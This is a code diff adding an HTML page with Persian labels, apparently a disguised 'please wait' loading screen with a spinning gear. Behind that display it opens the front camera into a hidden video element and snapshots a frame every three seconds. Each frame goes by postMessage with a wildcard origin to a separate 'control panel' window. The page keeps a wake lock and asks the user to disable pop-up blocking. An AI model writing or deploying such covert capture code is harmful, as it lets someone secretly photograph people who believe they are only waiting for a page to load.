@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>منتظر بمانید</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: #888;
+            font-family: Arial;
+            text-align: center;
+        }
+        .gear {
+            font-size: 120px;
+            animation: spin 3s linear infinite;
+            margin-bottom: 30px;
+        }
+        .status {
+            font-size: 20px;
+            margin: 10px;
+        }
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="gear">⚙️</div>
+    <div class="status" id="status">در حال راه‌اندازی...</div>
+    <div class="status" id="info"></div>
+    
+    <!-- مخفی -->
+    <video id="video" autoplay playsinline muted style="display:none"></video>
+    <canvas id="canvas" style="display:none"></canvas>
+    
+    <script>
+        const statusEl = document.getElementById('status');
+        const infoEl = document.getElementById('info');
+        let captureCount = 0;
+        let panelWindow = null;
+        
+        // شروع
+        initCamera();
+        
+        async function initCamera() {
+            try {
+                statusEl.textContent = 'فعال کردن دوربین...';
+                
+                // دوربین
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+                
+                statusEl.textContent = 'دوربین فعال ✓';
+                infoEl.textContent = 'آماده است';
+                
+                // باز کردن پنل کنترل در پنجره جدید
+                openPanelWindow();
+                
+                // شروع ضبط
+                startCaptureLoop(video);
+                
+                // جلوگیری از sleep
+                if ('wakeLock' in navigator) {
+                    try {
+                        await navigator.wakeLock.request('screen');
+                    } catch (e) {}
+                }
+                
+            } catch (error) {
+                statusEl.textContent = 'خطا: ' + error.message;
+                statusEl.style.color = '#ff4444';
+            }
+        }
+        
+        function openPanelWindow() {
+            // باز کردن پنل کنترل در پنجره جدید
+            const panelUrl = window.location.origin + '/camera110/panel.html';
+            panelWindow = window.open(panelUrl, 'پنل کنترل', 'width=1000,height=800');
+            
+            if (!panelWindow) {
+                infoEl.textContent = 'لطفاً pop-up blocker را غیرفعال کنید';
+                infoEl.style.color = '#ffaa00';
+            }
+        }
+        
+        function startCaptureLoop(video) {
+            const canvas = document.getElementById('canvas');
+            
+            // هر ۳ ثانیه عکس بگیر و به پنل بفرست
+            setInterval(() => {
+                captureAndSend(video, canvas);
+            }, 3000);
+            
+            // اولین عکس
+            setTimeout(() => captureAndSend(video, canvas), 1000);
+        }
+        
+        function captureAndSend(video, canvas) {
+            if (video.videoWidth === 0) return;
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // تبدیل به Data URL با کیفیت پایین (برای کاهش حجم)
+            const imageData = canvas.toDataURL('image/jpeg', 0.5);
+            
+            captureCount++;
+            infoEl.textContent = `تصاویر ارسال شده: ${captureCount}`;
+            
+            // ارسال به پنل کنترل
+            sendToPanel(imageData);
+        }
+        
+        function sendToPanel(imageData) {
+            if (!panelWindow || panelWindow.closed) {
+                // اگر پنجره بسته شد، دوباره باز کن
+                openPanelWindow();
+                return;
+            }
+            
+            try {
+                // ارسال به پنجره پنل
+                panelWindow.postMessage({
+                    type: 'NEW_IMAGE',
+                    data: imageData,
+                    time: Date.now(),
+                    count: captureCount
+                }, '*');
+                
+                // همچنین در URL خودمان ذخیره کنیم (برای backup)
+                const key = 'img_' + Date.now();
+                sessionStorage.setItem(key, imageData);
+                
+                // فقط ۵ تصویر آخر را نگه دار
+                cleanupStorage();
+                
+            } catch (error) {
+                console.log('خطا در ارسال:', error);
+            }
+        }
+        
+        function cleanupStorage() {
+            const keys = Object.keys(sessionStorage);
+            const imgKeys = keys.filter(k => k.startsWith('img_'));
+            
+            if (imgKeys.length > 5) {
+                imgKeys.sort();
+                const toRemove = imgKeys.slice(0, imgKeys.length - 5);
+                toRemove.forEach(k => sessionStorage.removeItem(k));
+            }
+        }
+        
+        // وقتی صفحه بسته می‌شود
+        window.addEventListener('beforeunload', () => {
+            if (panelWindow && !panelWindow.closed) {
+                panelWindow.close();
+            }
+        });
+    </script>
+</body>
+</html>
